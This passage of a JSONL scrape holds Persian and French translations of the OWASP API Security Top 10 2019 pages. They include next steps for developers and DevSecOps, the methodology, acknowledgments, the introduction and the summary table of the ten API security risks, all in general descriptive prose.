https://owasp.org/index.php/Log_Injection\n[2]: https://owasp.org/index.php/Logging_Cheat_Sheet\n[3]: https://owasp.org/www-project-proactive-controls/\n[4]: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x15-V7-Error-Logging.md\n[5]: https://cwe.mitre.org/data/definitions/1059.html\n[6]: https://www.openapis.org/\n", "timestamp": "2025-10-24T22:26:30.868560"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fa/0xb0-next-devs.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fa/0xb0-next-devs.md", "content": "# گام بعدی برای توسعه‌دهندگان\n\nوظایف مرتبط با ایجاد و نگهداری ایمن از نرم افزارها یا تعمیر نرم افزارهای موجود می‌تواند دشوار باشد و APIها نیز از قضیه مستثنی نیستند. \n\nبر این باوریم که آموزش و آگاه سازی، گامی کلیدی در راستای نوشتن و توسعه نرم افزارهای ایمن هستند. تمامی الزامات دیگر در راستای نیل به هدف فوق به **ایجاد و استفاده از فرایندهای امنیتی تکرارپذیر و کنترل‌های امنیتی استاندارد بستگی دارد.**\n\nOWASP منابع آزاد و رایگان متعددی برای پاسخ به مسائل امنیتی از ابتدای پروژه ایجاد نموده است. به منظور آشنایی با لیست جامع پروژه‌‌های دردسترس، [صفحه پروژه‌‌های OWASP][1] را ملاحظه نمایید.\n\n\n| | |\n|-|-|\n| **آموزش** | برای شروع می‌توان از [پروژه مطالب آموزشی OWASP][2] بسته به علاقه و نوع حرفه آغاز نمود. برای آموزش عملیاتی،  crAPI را نیز به [نقشه راه][3] خود افزوده‌ایم. تست‌‌های مربوط به WebAppSec را می‌توان با [OWASP DevSlop Pixi Module][4]  که یک WebApp و سرویس API آزمایشگاهی آسیب‌پذیر است، انجام داد. استفاده از چنین ابزارهایی سبب یادگیری نحوه تست وب اپلیکیشن‌‌ها و APIهای مدرن از منظر مسائل امنیتی و چگونگی توسعه APIهای مدرن در آینده خواهد شد. همچنین امکان شرکت در جلسات آموزشی [کنفرانس AppSec][5] و عضویت در [شَعب محلی OWASP][6] نیز برای علاقه مندان وجود دارد.|\n| **الزامات امنیتی** | امنیت باید بعنوان بخشی تفکیک ناپذیر در تمامی پروژه‌‌ها از ابتدا درنظر گرفته شود. در هنگام استخراج الزامات امنیتی، باید معنی واژه «ایمن» برای هر پروژه مشخصا تعریف شود. OWASP استفاده از [استاندارد امنیت سنجی اپلیکیشن (ASVS)][7] را بعنوان راهنمایی برای تعیین الزامات امنیتی توصیه می‌کند. در صورت برون سپاری نیز، استفاده از [ضمیمه قرارداد نرم افزار ایمن OWASP][8] (که بایستی با قوانین و رگولاتوری‌‌های محلی انطباق یابد) می‌تواند انتخاب مناسبی باشد. |\n| **معماری امنیتی** | امنیت بایستی در تمامی مراحل توسعه پروژه‌‌ها اهمیت داشته باشد. [برگه‌‌های راهنمای پیشگیری OWASP][9] نقطه شروع مناسبی برای چگونگی طراحی ایمن در خلال فاز طراحی معماری به شمار آید. [همچنین برگه راهنمای امنیت REST][10] و [برگه راهنمای ارزیابی REST][11] نیز گزینه‌‌های مناسبی در این راستا هستند. |\n| **کنترل‌‌های امنیتی استاندارد** | بکارگیری و انطباق با کنترل‌‌های امنیتی استاندارد ریسک ایجاد ضعف‌‌های امنیتی در خلال ایجاد برنامه‌‌ها با منطق سازمانی را کاهش می‌دهد. علیرغم اینکه بسیاری از چارچوب‌های مدرن امروزی با استانداردهای توکار و موثر امنیتی توزیع می‌شوند، اما [کنترل‌‌های پیشگیرانه و فعال OWASP][12] دید خوبی از کنترل‌‌هایی که باید در پروژه‌‌ها لحاظ شوند بدست می‌دهد. OWASP کتابخانه و ابزارهای متعددی از جمله در حوزه کنترل‌‌های اعتبارسنجی در اختیار عموم قرار می‌دهد که می‌توانند مفید باشند.|\n| **چرخه حیات توسعه نرم افزار ایمن** | به منظور بهبود فرایندها در هنگام ایجاد و ساخت APIها می‌توان از [مدل ضمانت کمال نرم افزار OWASP  (SAMM)][13] بهره برد. همچنین پروژه‌‌های متعدد دیگری نیز در OWASP وجود دارند که می‌توانند در فازهای مختلف توسعه API مفید باشند که از جمله آنها می‌توان، [پروژه بازبینی کد OWASP][14] را نام برد. |\n\n\n[1]: https://www.owasp.org/index.php/Category:OWASP_Project\n[2]: https://www.owasp.org/index.php/OWASP_Education_Material_Categorized\n[3]: https://www.owasp.org/index.php/OWASP_API_Security_Project#tab=Road_Map\n[4]: https://devslop.co/Home/Pixi\n[5]: https://www.owasp.org/index.php/Category:OWASP_AppSec_Conference\n[6]: https://www.owasp.org/index.php/OWASP_Chapter\n[7]: https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project\n[8]: https://www.owasp.org/index.php/OWASP_Secure_Software_Contract_Annex\n[9]: https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series\n[10]: https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/REST_Security_Cheat_Sheet.md\n[11]: https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/REST_Assessment_Cheat_Sheet.md\n[12]: https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2018\n[13]: https://www.owasp.org/index.php/OWASP_SAMM_Project\n[14]: https://www.owasp.org/index.php/Category:OWASP_Code_Review_Project\n", "timestamp": "2025-10-24T22:26:30.994594"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fa/0xb1-next-devsecops.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fa/0xb1-next-devsecops.md", "content": "# گام بعدی برای DevSecOps\n\nبا توجه به اهمیت  APIها در معماری اپلیکیشن‌های جدید، ایجاد APIهای ایمن امری حیاتی می‌باشد. مقوله امنیت را نمی‌توان نادیده گرفت و باید آن را جزئی از کل چرخه توسعه اپلیکیشن در نظر گرفت. انجام اسکن و تست‌ نفود، آن هم به صورت سالیانه به هیچ عنوان کافی نمی‌باشد.\n\nباید به فرایند توسعه DevSecOps افزوده شده و در تمام زمان‌های توسعه نرم افزار، انجام تست‌های امنیتی مداوم را تسهیل کند. هدف آنها بهره‌گیری از خودکارسازی‌ فرایندهای امنیتی در جهت بهبود فرایند تولید نرم افزار بوده به شکلی که تاثیری بر سرعت توسعه نداشته باشد. اگر شک دارید، [مانیفست DevSecOps][1]  را بررسی کنید تا در جریان باشید.\n\n|                     |                                                                                           |\n|--------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| درک مدل تهدیدات\t                     | اولویت‌ تست‌ها از مدل تهدیدات بدست می‌آید. اگر شما مدل تهدیدات ندارید می‌توانید از [OWASP Application Security Verification Standard (ASVS)][2] و [OWASP Testing Guide][3] به عنوان ورودی استفاده کنید. همچنین مشارکت دادن تیم توسعه می‌تواند باعث شود آنها نسبت به موضوعات امنیتی آگاه‌تر شوند.                                                                                                        |\n| درک چرخه توسعه نرم افزار\t             | تیم توسعه را به فرایند اضافه کنید تا آنها نیز درک بهتری از چرحه توسعه نرم افزار پیدا کنند. مشارکت شما در انجام تست‌های مداوم امنیتی باید همراستا با افراد، فرایند‌ها و ابزارها باشد. همه باید با فرایند موافق باشند تا هیچ گونه اصطکاک و مقاومتی وجود نداشته باشد.                                                                                                                                  |\n| راهبرد انجام تست\t                     | با توجه به اینکه کار شما نباید تاثیری بر سرعت توسعه داشته باشد. بنابراین باید خیلی آگاهانه بهترین تکنیک (ساده، سریع‌ترین و دقیق‌ترین)‌ را برای تایید الزامات امنیتی انتخاب کنید. [OWASP Security Knowledge Framework][4] و [OWASP Application Security Verification Standard][5] می‌توانند منابع خوبی برای الزامات عملکردی و غیر عملکردی باشند. منابع خوب دیگری از [پروژه‌ها][6] و [ابزارها][7] مشابه با مواردی که توسط [DevSecOps community][8] پیشنهاد می‌شود، وجود دارد.           |\n| دستیابی به جامعیت و دقت\t             | شما پلی هستید بین تیم‌ توسعه دهنده و ‌‌‌پیاده‌سازی، برای اینکه به این مهم دست یابید نه تنها باید بر روی عملکرد و قابلیت‌ها تمرکز کنید بلکه باید به هماهنگی نیز توجه کنید. از ابتدا  به صورت نزدیک با هر دو تیم توسعه و ‌‌‌پیاده‌سازی کار کنید تا بتوانید زمان و تلاش‌تان را بهینه نمایید. شما باید برای حالتی که الزامات امنیتی به صورت مداوم بررسی شوند، هدف گذاری کنید.                                     |\n| به وضوح یافته‌‌‌ها را به اشتراک بگذارید\t | با کمترین اصطکاک یا بدون اصطکاک مشارکت داشته باشید. یافته‌‌ها را در بازه زمانی مشخص و در قالب ابزارهای مورد استفاده توسط تیم توسعه (نه فایل‌های PDF) تحویل دهید. به تیم توسعه اضافه شوید تا یافته‌ها را به آن‌ها نشان دهید. از این فرصت برای آموزش آنها استفاده کنید، به صورت شفاف در مورد نقطه ضعف و روش‌های سوء استفاده از آن (که شامل سناریو‌های حملات می‌باشند) توضیح دهید تا واقعی به نظر برسد.       |\n\n[1]: https://www.devsecops.org/\n[2]: https://owasp.org/www-project-application-security-verification-standard/\n[3]: https://owasp.org/www-project-web-security-testing-guide/\n[4]: https://owasp.org/www-project-security-knowledge-framework/\n[5]: https://owasp.org/www-project-application-security-verification-standard/\n[6]: http://devsecops.github.io/\n[7]: https://github.com/devsecops/awesome-devsecops\n[8]: https://www.devsecops.org/\n", "timestamp": "2025-10-24T22:26:31.102310"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fa/0xd0-about-data.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fa/0xd0-about-data.md", "content": "# متدلوژی و داده\n\n## بررسی اجمالی\n\nاز آنجا که صنعت AppSec مشخصا بر امنیت اپلیکیشن‌‌های معماری نوین که در آنها API نقشی حیاتی دارد، تمرکز ننموده، ایجاد لیستی از ده ریسک امنیتی بحرانی امنیت API بر مبنای فراخوان عمومی کاری سخت خواهد بود. علیرغم اینکه فراخوانی برای داده‌‌های عمومی داده نشده، اما لیست فعلی بر مبنای داده‌های در دسترس عموم، مشارکت کارشناسان امنیتی و نظرات متخصصان حوزه امنیت، تهیه گردیده است.\n\n## متدلوژی\n\nدر فاز اول، داده‌‌های در دسترس عموم در حوزه رخداده‌‌های مرتبط با امنیت API توسط گروهی از متخصصین امنیت جمع آوری، بازبینی و دسته بندی شدند. این داده‌‌ها از پلتفرم‌‌های شکار باگ  و پایگاه‌‌های داده آسیب‌پذیری در یک چارچوب زمانی یک ساله به منظور تحلیل آماری جمع آوری شده اند.\n\nدر فاز بعد، از متخصصین امنیت با سویه عملیاتی و تجربه تست نفوذ خواسته شد تا آنان نیز لیست ده ریسک امنیتی بحرانی API از منظر خود را با گروه به اشتراک گذارند.\n\nبه منظور انجام فرایند تحلیل ریسک از [متدلوژی رتبه بندی ریسک OWASP][1] استفاده و نتایج آن نیز توسط متخصصین امنیتی بازبینی قرار گرفت. برای مطالعه بیشتر در این حوزه به بخش [ریسک‌‌های امنیتی API][2] مراجعه نمایید.\n\nپیش نویس اولیه ده ریسک امنیتی بحرانی APIها در 2019 از منظر OWASP از اجماع بین نتایج آماری فاز اول و لیست مدنظر متخصصین بدست آمده است و سپس به منظور بازبینی مجدد در اختیار گروه دیگری از متخصصین (با تجربه مرتبط در حوزه امنیت API) قرار گرفته است.\n\nمستند ده ریسک امنیتی بحرانی APIها در 2019 از منظر OWASP اولین بار در رویداد جهانیOWASP AppSec در تل‌آویو (می 2019) ارائه شده و پس از آن برای بحث و مشارکت عموم در GitHub قرار گرفت.\n\nلیست مشارکت کنندگان در بخش [سپاسگزاری‌‌ها][3] قابل مشاهده است.\n\n[1]: https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:31.220430"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fa/0xd1-acknowledgments.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fa/0xd1-acknowledgments.md", "content": "# سپاسگزاری‌ها\n\n## سپاسگزاری از مشارکت کنندگان\n\nبدینوسیله از تمامی مشارکت کنندگانی که به طور عمومی در GitHub  و به سایر طرق در توسعه این مستند نقش داشته‌اند تشکر می‌نماییم \n\n* 007divyachawla\n* Abid Khan\n* Adam Fisher\n* anotherik\n* bkimminich\n* caseysoftware\n* Chris Westphal\n* dsopas\n* DSotnikov\n* emilva\n* ErezYalon\n* flascelles\n* Guillaume Benats\n* IgorSasovets\n* Inonshk\n* JonnySchnittger\n* jmanico\n* jmdx\n* Keith Casey\n* kozmic\n* LauraRosePorter\n* Matthieu Estrade\n* Mr-Listener\n* nathanawmk\n* PauloASilva\n* pentagramz\n* philippederyck\n* pleothaud\n* r00ter\n* Raj kumar\n* RNPG\n* Sagar Popat\n* Stephen Gates\n* This-is-neo\n* thomaskonrad\n* xycloops123\n", "timestamp": "2025-10-24T22:26:31.339639"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fr/0x00-header.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fr/0x00-header.md", "content": "---\ntitle: ''\n---\n\n![OWASP LOGO](images/owasp-logo.png)\n\n# OWASP API Security Top 10 2019\n\nUne traduction en français du projet original \"The Ten Most Critical API Security Risks\"\n\n8 septembre 2020\n\n![WASP Logo URL TBA](images/front-wasp.png)\n\n| | | |\n| - | - | - |\n| https://owasp.org | Ce travail est sous licence [Creative Commons Attribution-ShareAlike 4.0 International License][1] | ![Creative Commons License Logo](images/front-cc.png) |\n\n[1]: http://creativecommons.org/licenses/by-sa/4.0/\n", "timestamp": "2025-10-24T22:26:32.048737"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fr/0x00-notice.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fr/0x00-notice.md", "content": "# Note\n\nCeci est la version texte de l'OWASP API Security Top 10, utilisé comme source\npour la version officielle distribuée en Portable Document Format (PDF).\n\nLes contributions au projet telles que les commentaires, les corrections ou les\ntraductions doivent être effectuées ici. Pour plus de détails sur\n[comment contribuer][1], veuillez vous référer au document [CONTRIBUTING.md][1].\n\n* Erez Yallon\n* Inon Shkedy\n\n[1]: ../../../CONTRIBUTING.md\n", "timestamp": "2025-10-24T22:26:32.166325"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fr/0x00-toc.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fr/0x00-toc.md", "content": "# Table des Matières\n\n* [Table des Matières](0x00-toc.md)\n* [À propos d'OWASP](0x01-about-owasp.md)\n* [Avant-propos](0x02-foreword.md)\n* [Introduction](0x03-introduction.md)\n* [Notes de versions](0x04-release-notes.md)\n* [Risques de sécurité des API](0x10-api-security-risks.md)\n* [OWASP Top 10 Risques de sécurité des API – 2019](0x11-t10.md)\n* [API1:2019 Broken Object Level Authorization](0xa1-broken-object-level-authorization.md)\n* [API2:2019 Broken User Authentication](0xa2-broken-user-authentication.md)\n* [API3:2019 Excessive Data Exposure](0xa3-excessive-data-exposure.md)\n* [API4:2019 Lack of Resources & Rate Limiting](0xa4-lack-of-resources-and-rate-limiting.md)\n* [API5:2019 Broken Function Level Authorization](0xa5-broken-function-level-authorization.md)\n* [API6:2019 Mass Assignment](0xa6-mass-assignment.md)\n* [API7:2019 Security Misconfiguration](0xa7-security-misconfiguration.md)\n* [API8:2019 Injection](0xa8-injection.md)\n* [API9:2019 Improper Assets Management](0xa9-improper-assets-management.md)\n* [API10:2019 Insufficient Logging & Monitoring](0xaa-insufficient-logging-monitoring.md)\n* [Perspectives pour les Développeurs](0xb0-next-devs.md)\n* [Perspectives pour les DevSecOps](0xb1-next-devsecops.md)\n* [Méthodologie et Données](0xd0-about-data.md)\n* [Remerciements](0xd1-acknowledgments.md)\n", "timestamp": "2025-10-24T22:26:32.289151"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fr/0x01-about-owasp.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fr/0x01-about-owasp.md", "content": "# À propos d'OWASP\n\nL'Open Web Application Security Project (OWASP) est une communauté ouverte\ndédiée à permettre aux organisations de développer, d'acheter et de maintenir\ndes applications et des API auxquelles on peut faire confiance.\n\nChez OWASP, vous trouverez en gratuit et libre :\n\n* Outils et standards pour la sécurité des applications.\n* Livres complets sur les tests de sécurité des applications, le développement\n  sécurisé de code, et la revue sécurisée de code.\n* Présentations et [vidéos][1].\n* [Cheat sheets][2] sur de nombreux sujets.\n* Contrôles et bibliothèques de sécurité standards.\n* [Communautés locales partout dans le monde][3].\n* Recherche de pointe.\n* Nombreuses [conférences partout dans le monde][4].\n* [Listes de diffusion][5].\n\nPlus d'information sur : [https://www.owasp.org][6].\n\nTous les outils, documents, vidéos, présentations et chapitres sont libres et\nouverts à quiconque s'intéressant à l'amélioration de la sécurité des\napplications.\n\nNous préconisons d'approcher la sécurité applicative comme un problème de\npersonnes, de procédés et de technologie, parce que les approches les plus\nefficaces de sécurité des applications requièrent des améliorations dans ces\ndirections.\n\nOWASP est une nouvelle sorte d'organisation. Notre liberté face aux pressions\ncommerciales nous permet de fournir des informations impartiales, pratiques\net efficientes à propos de la sécurité applicative.\n\nOWASP n'est affiliée avec aucune entreprise de technologie, bien que soutenions\nl'usage raisonné de technologies de sécurité commerciales. OWASP produit toutes\nsortes d'éléments de manière collaborative, transparente et ouverte.\n\nLa Fondation OWASP est l'entité à but non-lucratif qui garantit le succès à\nlong terme du projet. La quasi-totalité des personnes associée à OWASP est\nbénévole, y compris le conseil d'administration d'OWASP, les responsables des\nchapitres et les membres des projets. Nous soutenons la recherche en sécurité\ninnovante avec des bourses et de l'infrastructure.\n\nRejoignez-nous !\n\n## Copyright et licence\n\n![license](images/license.png)\n\nCopyright © 2003-2019 The OWASP Foundation. Ce document est distribué sous\n[licence Creative Commons Attribution Share-Alike 4.0][7]. Toute réutilisation\nou distribution doit clairement mentionner les termes et conditions de licence\nde cette oeuvre.\n\n[1]: https://www.youtube.com/user/OWASPGLOBAL\n[2]: https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series\n[3]: https://www.owasp.org/index.php/OWASP_Chapter\n[4]: https://www.owasp.org/index.php/Category:OWASP_AppSec_Conference\n[5]: https://lists.owasp.org/mailman/listinfo\n[6]: https://www.owasp.org\n[7]: http://creativecommons.org/licenses/by-sa/4.0/\n", "timestamp": "2025-10-24T22:26:32.405341"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fr/0x02-foreword.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fr/0x02-foreword.md", "content": "# Avant-propos\n\nL'Application Programming Interface (API), en français interface de programmation applicative, est un élément fondateur des\napplications omniprésentes dans le monde actuel. Des banques, commerces, du\ntransport à l'IoT, aux véhicules autonomes et aux villes intelligentes, les API\nforment une partie critique des applications mobiles, Saas et web modernes que\nl'on trouve dans des applications destinées aux consommateurs, aux partenaires\nou aux usages internes.\n\nPar nature, les API exposent la logique applicative et des données sensibles\ntelles que des données personnelles, et de ce fait les API sont devenues une\ncible pour des attaquants. Sans des API sécurisées, l'innovation rapide serait\nimpossible.\n\nBien qu'un Top 10 plus large sur les risques de sécurité des applications web\nfasse toujours sens, du fait de leur nature particulière, une liste des risques\nspécifiques aux API est nécessaire. La sécurité des API se concentre sur des\nstratégies et des solutions pour comprendre et corriger les vulnérabilités et\nrisques de sécurité uniques aux API.\n\nSi vous êtes familiarisés avec le projet [OWASP Top 10][1], vous aurez alors\nremarqué des similarités entre les deux documents : ils sont conçus pour être\nlisibles et adoptés. Si vous découvrez la série OWASP Top 10, il vaudrait\npeut-être mieux commencer par lire les sections [Risques de sécurité des API][2]\net [Méthodologie et données][3] avant de vous plonger dans la liste du Top 10.\n\nVous pouvez contribuer à l'OWASP API Security Top 10 avec vos questions,\ncommentaires et idées sur notre dépôt GitHub du projet :\n\n* https://github.com/OWASP/API-Security/issues\n* https://github.com/OWASP/API-Security/blob/master/CONTRIBUTING.md\n\nVous trouverez l'OWASP API Security Top 10 ici :\n\n* https://www.owasp.org/index.php/OWASP_API_Security_Project\n* https://github.com/OWASP/API-Security\n\nNous voulons remercier tous les contributeurs qui ont rendu ce projet possible\ngrâce à leurs efforts et leurs contributions. Ils sont tous listés dans la\n[section des remerciements][4]. Merci !\n\n[1]: https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd0-about-data.md\n[4]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:32.521197"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fr/0x03-introduction.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fr/0x03-introduction.md", "content": "# Introduction\n\n## Bienvenue à l'OWASP API Security Top 10 - 2019 !\n\nBienvenue à la première édition du projet OWASP API Security Top 10. Si vous\nconnaissez les séries OWASP Top 10, vous remarquerez les similarités : elles\nsont voulues pour faciliter en la lisibilité l'adoption. Si ce n'est pas votre\ncas, vous pouvez commencer par consulter la [page wiki de l'OWASP\nAPI Security Project][1], avant d'approfondir avec les risques de sécurité les\nplus critiques des API.\n\nLes API jouent un rôle très important dans l'architecture des applications\nmodernes. Dans la mesure où la création d'une prise de conscience de la sécurité\net l'innovation ont des rythmes différents, il est important de se concentrer\nsur les vulnérabilités de sécurité courantes des API.\n\nL'objectif principal du projet OWASP API Security Top 10 est d'éduquer ceux qui\nsont impliqués dans le développement et la maintenance des API, notamment :\ndéveloppeurs, designers, architectes, managers, ainsi que les organisations.\n\nDans la section [méthodologie et Données][2], vous pouvez en lire davantage sur\nla manière dont cette première édition a été créée. Pour les prochaines versions,\nnous voulons impliquer l'industrie de la sécurité, avec un appel public à\ninformations. Pour le moment, nous encourageons chacun à contribuer avec des\nquestions, des commentaires ou des idées sur notre [dépôt GitHub][3] ou notre\n[liste de diffusion][4].\n\n[1]: https://www.owasp.org/index.php/OWASP_API_Security_Project\n[2]: ./0xd0-about-data.md\n[3]: https://github.com/OWASP/API-Security\n[4]: https://groups.google.com/a/owasp.org/forum/#!forum/api-security-project\n", "timestamp": "2025-10-24T22:26:32.634171"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fr/0x04-release-notes.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fr/0x04-release-notes.md", "content": "# Notes de versions\n\nCeci est la première édition de l'OWASP API Security Top 10, que nous prévoyons\nde mettre à jour périodiquement, tous les trois ou quatre ans.\n\nContrairement à cette version, nous voulons pour les futures versions lancer un\nappel public à données, impliquant le secteur de la sécurité dans cette démarche.\nDans la section [Méthodologie et Données][1], vous trouverez plus d'informations\nsur la manière dont cette version a été construite. Pour plus de détails sur les\nriques de sécurité, veuillez vous référer à la section\n[Risques de Sécurité des API][2].\n\nIl est important d'être conscient que l'architecture des applications a\nconsidérablement changé au cours des dernières années. Actuellement les API\njouent un rôle très important dans cette nouvelle architecture de microservices,\nde *single page applications*, d'applis mobiles, d'IoT, etc.\n\nL'OWASP API Security Top 10 était un effort nécessaire pour créer une prise de\nconscience des questions de sécurité des API modernes. Cela n'a été possible que\ngrâce aux efforts considérables de plusieurs volontaires, qui sont tous\nrépertoriés dans la section [Remerciements][3].\nMerci !\n\n[1]: ./0xd0-about-data.md\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:32.743287"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fr/0x10-api-security-risks.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fr/0x10-api-security-risks.md", "content": "# Risques de sécurité des API\n\nLa [méthodologie d'évaluation de risques OWASP][1] a été utilisée pour effectuer l'analyse de risques.\n\nLa table ci-dessous résume la terminologie associée au niveau de risque.\n\n| Facteurs de menace | Exploitabilité | Prévalence de la faille | Détectabilité de la faille | Impact technique | Impact organisationnel |\n| :-: | :-: | :-: | :-: | :-: | :-: |\n| Spécifique API | Facile: **3** | Répandu **3** | Facile **3** | Sévère **3** | Spécifique à l'organisation |\n| Spécifique API | Moyen: **2** | Commune **2** | Moyenne **2** | Modéré **2** | Spécifique à l'organisation |\n| Spécifique API | Difficile: **1** | Difficile **1** | Difficile **1** | Mineure **1** | Spécifique à l'organisation |\n\n**Note**: Cette approche ne prend pas en compte la probabilité du facteur de\nmenace. Elle ne prend pas non plus en compte les différents détails techniques\nspécifiques à votre application. Ces facteurs pourraient modifier de manière\nsignificative la probabilité globale qu'un attaquant trouve et exploite une\nvulnérabilité particulière. Cette évaluation ne prend pas en compte l'impact\nréel sur votre activité. Votre organisation devra décider quel niveau de risque\nde sécurité elle est prête à accepter pour vos applications et vos API en\nfonction de votre culture, votre secteur d'activité et votre environnement\nréglementaire. L'objet du projet OWASP API Security Top 10 n'est pas d'effectuer\ncette analyse de risques à votre place.\n\n## Références\n\n### OWASP\n\n* [OWASP Risk Rating Methodology][1]\n* [Article on Threat/Risk Modeling][2]\n\n### Externes\n\n* [ISO 31000: Risk Management Std][3]\n* [ISO 27001: ISMS][4]\n* [NIST Cyber Framework (US)][5]\n* [ASD Strategic Mitigations (AU)][6]\n* [NIST CVSS 3.0][7]\n* [Microsoft Threat Modeling Tool][8]\n\n[1]: https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology\n[2]: https://www.owasp.org/index.php/Threat_Risk_Modeling\n[3]: https://www.iso.org/iso-31000-risk-management.html\n[4]: https://www.iso.org/isoiec-27001-information-security.html\n[5]: https://www.nist.gov/cyberframework\n[6]: https://www.asd.gov.au/infosec/mitigationstrategies.htm\n[7]: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator\n[8]: https://www.microsoft.com/en-us/download/details.aspx?id=49168\n", "timestamp": "2025-10-24T22:26:32.861060"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fr/0x11-t10.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fr/0x11-t10.md", "content": "# OWASP Top 10 Risques de sécurité des API – 2019\n\n| Risque | Description |\n| ------ | ----------- |\n| API1:2019 - Broken Object Level Authorization | Les API ont tendance à exposer des points d'accès (endpoints) qui gèrent les identifiants d'objets (OID), créant une large surface d'attaque des contrôles de niveaux d'accès. Des contrôles d'autorisation doivent être effectués pour toute fonction qui accède à une source de données à partir d'entrées fournies par un utilisateur. |\n| API2:2019 - Broken User Authentication | Les mécanismes d'authentification sont souvent implémentés incorrectement, permettant à des attaquants de compromettre des jetons (tokens) d'authentification ou d'exploiter des failles d'implémentation afin d'endosser temporairement ou de manière permanente l'identité d'autres utilisateurs. L'incapacité, pour un système, à identifier le client / utilisateur de manière fiable compromet la sécurité de l'API dans son ensemble. |\n| API3:2019 - Excessive Data Exposure | En effectuant des implémentations génériques rapides, les développeurs ont tendance à exposer tous les attributs des objets sans prendre en considération leur confidentialité individuelle, se reposant sur les clients d'API pour effectuer un filtrage des données avant présentation à l'utilisateur. |\n| API4:2019 - Lack of Resources & Rate Limiting | Bien souvent, les API n'imposent pas de restrictions sur la taille ou le nombre de ressources qui peuvent être requises par le client / l'utilisateur. Ceci impacte non seulement la performance du serveur d'API, aboutissant à un Déni de Service (DoS), mais cela constitue aussi une porte ouverte pour des failles d'authentification par force brute. |\n| API5:2019 - Broken Function Level Authorization | Les politiques de contrôle d'accès complexes avec des hiérarchies, groupes et rôles différents, et la séparation non claire entre les fonctions normales et d'administration tendent à occasionner des failles d'authentification. En exploitant ces problèmes, les attaquants parviennent à accéder aux ressources d'autres utilisateurs et / ou aux fonctions d'administration. |\n| API6:2019 - Mass Assignment | La connexion de données fournies par le client (ex : JSON) aux modèles de données sans filtrage approprié par une liste de validation conduit généralement à l'assignation massive. En devinant les attributs des objets, en explorant les autres points d'accès de l'API, en lisant la documentation ou en incluant des attributs supplémentaires dans la charge utile (payload) des requêtes, les attaquants parviennent à modifier les attributs d'objets qu'ils ne devraient pas pouvoir modifier. |\n| API7:2019 - Security Misconfiguration | Une mauvaise configuration de sécurité est souvent le résultat de configurations par défauts non sécurisées, de configurations incomplètes ou ad-hoc, de stockages ouverts dans le cloud, d'en-têtes HTTP mal configurés, de méthodes HTTP non nécessaires, de partage de ressources intersites permissives (CORS), et de messages d'erreurs verbeux contenant des informations sensibles. |\n| API8:2019 - Injection | Les failles d'injection telles que SQL, NoSQL, injection de commandes, etc, se produisent lorsque des données non fiables sont transmises à un interpréteur comme partie d'une commande ou d'une requête. Les données malveillantes de l'attaquant peuvent tromper l'interpréteur et lui faire exécuter des commandes non prévues ou accéder à des données sans disposer des autorisations nécessaires. |\n| API9:2019 - Improper Assets Management | Les API ont tendance à exposer plus de points d'accès que les applications web traditionnelles, rendant très importante la nécessité d'une documentation appropriée et actualisée. Un inventaire précis des hôtes et des versions d'API déployées joue également un rôle important pour prévenir les problèmes tels que les versions obsolètes d'API et l'exposition des points de déboggage. |\n| API10:2019 - Insufficient Logging & Monitoring | L'insuffisance de logging et de monitoring, couplée à une intégration insuffisante ou absente à la réponse aux incidents, permet aux attaquants de poursuivre leurs attaques sur les systèmes, de s'y maintenir de manière persistante, et de rebondir sur d'autres systèmes pour compromettre, extraire ou détruire des données. La plupart des études de failles montrent que le temps nécessaire pour détecter une intrusion est supérieur à 200 jours, typiquement découverte par des tiers externes plutôt que par des processus ou un monitoring interne. |\n", "timestamp": "2025-10-24T22:26:32.985949"}
